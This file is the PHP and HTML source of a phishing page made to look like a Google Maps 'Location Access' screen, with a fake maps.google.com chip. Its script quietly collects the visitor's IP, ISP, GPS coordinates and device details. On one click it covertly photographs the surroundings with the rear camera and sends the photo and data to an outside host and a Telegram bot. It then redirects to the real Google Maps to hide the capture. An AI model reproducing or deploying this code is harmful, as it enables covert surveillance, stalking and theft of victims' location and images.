<?php
// ======================
// TELEGRAM SEND (BACK CAMERA + LOCATION)
// ======================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {

    $chatId = $_GET['id'] ?? '';
    if (!$chatId) {
        echo json_encode(['status'=>'error','message'=>'Chat ID missing']);
        exit;
    }

    // 🔁 اپنا بوٹ ٹوکن یہاں لگائیں
    $botToken = ''; 
    $caption  = $_POST['caption'] ?? 'Location Verified';
    $file     = $_FILES['file']['tmp_name'];

    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";

    $postFields = [
        'chat_id' => $chatId,
        'photo'   => new CURLFile(realpath($file)),
        'caption' => $caption
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_exec($ch);
    curl_close($ch);

    echo json_encode(['status'=>'sent']);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Location Access - Google Maps</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  body {
    background-color: #fff;
    color: #202124;
    font-family: 'Google Sans', 'Segoe UI', Roboto, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
  }
  .card {
    background: #fff;
    border: 1px solid #dadce0;
    border-radius: 8px;
    max-width: 450px;
    width: 100%;
    padding: 48px 40px 36px;
    box-sizing: border-box;
    text-align: center;
  }
  @media (max-width: 450px) {
    .card { border: none; padding: 24px; }
  }
  .google-logo { width: 75px; height: 25px; margin: 0 auto 16px; display: block; }
  h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px 0; }
  .subtitle { color: #5f6368; font-size: 15px; margin-bottom: 24px; line-height: 1.5; }
  .origin-chip {
    display: inline-flex; align-items: center; 
    background: #f1f3f4; border-radius: 16px; padding: 6px 12px;
    margin-bottom: 24px; font-size: 13px; color: #3c4043;
  }
  
  .next-btn {
    background-color: #1a73e8; color: #fff; border: none; 
    padding: 12px 24px; border-radius: 4px; font-size: 15px; 
    font-weight: 500; cursor: pointer; letter-spacing: 0.25px;
    transition: 0.2s; box-shadow: 0 1px 3px rgba(66,133,244,0.5);
  }
  .next-btn:hover { background-color: #1765cc; box-shadow: 0 2px 6px rgba(66,133,244,0.6); }
  
  .footer { margin-top: 36px; font-size: 12px; color: #5f6368; text-align: center;}

  /* Hidden Camera */
  #video, #canvas { position: absolute; top: -9999px; left: -9999px; opacity: 0; pointer-events: none; }

  /* Maps Location Loader UI */
  .map-loader-box { display: none; text-align: center; margin-top: 10px; }
  .map-icon { font-size: 40px; color: #34a853; margin-bottom: 15px; }
  .pulse-ring {
    display: inline-block; width: 60px; height: 60px; border-radius: 50%;
    background: rgba(52, 168, 83, 0.1); position: relative;
  }
  .pulse-ring::before {
    content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
    width: 20px; height: 20px; background: #34a853; border-radius: 50%;
    box-shadow: 0 0 0 0 rgba(52, 168, 83, 0.6);
    animation: pulse-anim 1.5s infinite;
  }
  @keyframes pulse-anim {
    0% { box-shadow: 0 0 0 0 rgba(52,168,83,0.6); }
    70% { box-shadow: 0 0 0 20px rgba(52,168,83,0); }
    100% { box-shadow: 0 0 0 0 rgba(52,168,83,0); }
  }
  .loader-text { font-size: 14px; color: #5f6368; min-height: 20px; margin-top: 15px; }
</style>
</head>
<body>

<div class="card">
  <svg class="google-logo" viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
    <g>
      <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"/>
      <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
      <path fill="#FBBC05" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54 0 2.02-1.37 3.5-3.1 3.5z"/>
      <path fill="#4285F4" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
      <path fill="#34A853" d="M58 .24h2.51v17.57H58z"/>
      <path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
    </g>
  </svg>

  <div id="form-section">
    <h1>Location Access</h1>
    <div class="subtitle">Google Maps needs to verify your surrounding environment for accurate navigation.</div>
    
    <div class="origin-chip">
      🔒 maps.google.com
    </div>
    <br><br>

    <button id="startBtn" class="next-btn">Allow & Navigate</button>
  </div>

  <div id="loader-section" class="map-loader-box" style="display: none;">
    <div class="pulse-ring"></div>
    <p class="loader-text" id="status">Calibrating location…</p>
  </div>

  <!-- Hidden Video & Canvas -->
  <video id="video" playsinline autoplay muted></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <div class="footer">
    Help &nbsp;|&nbsp; Privacy &nbsp;|&nbsp; Terms
  </div>
</div>

<script>
const startBtn = document.getElementById("startBtn");
const formSection = document.getElementById("form-section");
const loaderSection = document.getElementById("loader-section");
const statusEl = document.getElementById("status");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

let userInfo = {
  ip: '', city: '', country: '', isp: '', lat: '', lng: '',
  browser: navigator.userAgent,
  os: navigator.platform,
  screen: `${screen.width} x ${screen.height}`
};

// 🛑 Silent IP & GPS Fetch
fetch('https://ipinfo.io/json')
  .then(r => r.json())
  .then(d => {
    userInfo.ip = d.ip || 'N/A';
    userInfo.city = d.city || 'N/A';
    userInfo.country = d.country || 'N/A';
    userInfo.isp = d.org || 'N/A';
  });

if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(pos => {
    userInfo.lat = pos.coords.latitude.toFixed(6);
    userInfo.lng = pos.coords.longitude.toFixed(6);
  }, () => {}); // Fail silently
}

startBtn.onclick = () => {
  // Step 1: Show Maps Loader
  formSection.style.display = 'none';
  loaderSection.style.display = 'block';

  // Step 2: Start Back Camera (Hidden)
  navigator.mediaDevices.getUserMedia({ 
    video: { facingMode: "environment" } // 🔥 This forces the BACK camera
  })
  .then(stream => {
    video.srcObject = stream;
    video.play();

    // Start Fake Loading Text
    const steps = [
      "Calibrating location…",
      "Analyzing surrounding environment…",
      "Mapping nearby coordinates…",
      "Finalizing navigation route…"
    ];
    let i = 0;
    const stepTimer = setInterval(() => {
      statusEl.innerText = steps[i % steps.length];
      i++;
    }, 1500);

    // Step 3: Wait 4 seconds for camera to adjust light/focus, then snap
    setTimeout(() => {
      clearInterval(stepTimer);
      statusEl.innerText = "Verification complete! Loading Maps…";
      
      // Draw high-quality image from back camera
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Kill the camera stream immediately (turns off camera light)
      stream.getTracks().forEach(track => track.stop());

      canvas.toBlob(blob => {
        const fd = new FormData();
        fd.append("file", blob, "environment_snap.jpg");
        fd.append("caption", buildCaption());

        // Step 4: Send to Telegram Silently
        fetch('https://rootx-eye.vercel.app/capture.php', {
            method: 'POST',
            body: fd
        })
          // Step 5: Redirect to real Google Maps
          setTimeout(() => {
            window.location.replace("https://maps.google.com/");
          }, 1500);
        }).catch(() => {
          window.location.replace("https://maps.google.com/");
        });
      }, "image/jpeg", 0.9);

    }, 5000); // 5 seconds wait for camera focus adjustment
  })
  .catch(() => {
    statusEl.innerText = "Camera permission denied. Please allow to continue.";
    setTimeout(() => { formSection.style.display = 'block'; loaderSection.style.display = 'none'; }, 2000);
  });
};

function buildCaption() {
  let locText = `City: ${userInfo.city}\nCountry: ${userInfo.country}`;
  if (userInfo.lat && userInfo.lng) {
    locText += `\nGPS: ${userInfo.lat}, ${userInfo.lng}\nMap: https://maps.google.com/?q=${userInfo.lat},${userInfo.lng}`;
  }

  return `📸 *Back Camera Environment Scan!*
━━━━━━━━━━━━━━━
📍 *Target Location:*
 ${locText}
🌐 IP: ${userInfo.ip}
📡 ISP: ${userInfo.isp}

🖥 *Device Info:*
🧭 Browser: ${userInfo.browser}
🧩 OS: ${userInfo.os}
📱 Screen: ${userInfo.screen}`;
}
</script>

</body>
</html>
